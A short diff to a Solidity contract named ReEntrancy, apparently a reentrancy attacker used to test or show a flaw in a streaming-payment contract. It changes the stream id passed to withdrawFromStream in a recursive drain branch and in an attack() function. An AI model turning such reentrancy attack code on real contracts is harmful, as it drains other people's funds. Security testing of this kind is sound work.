@@ -25,7 +25,7 @@ contract ReEntrancy {
 
         if(address(_payment).balance >= 0.2 ether) {
 
-            _payment.withdrawFromStream(1);
+            _payment.withdrawFromStream(0);
            
 
         }
@@ -36,7 +36,7 @@ contract ReEntrancy {
 
     function attack() external {
         
-         _payment.withdrawFromStream(1);        
+         _payment.withdrawFromStream(0);        
 
     }
 
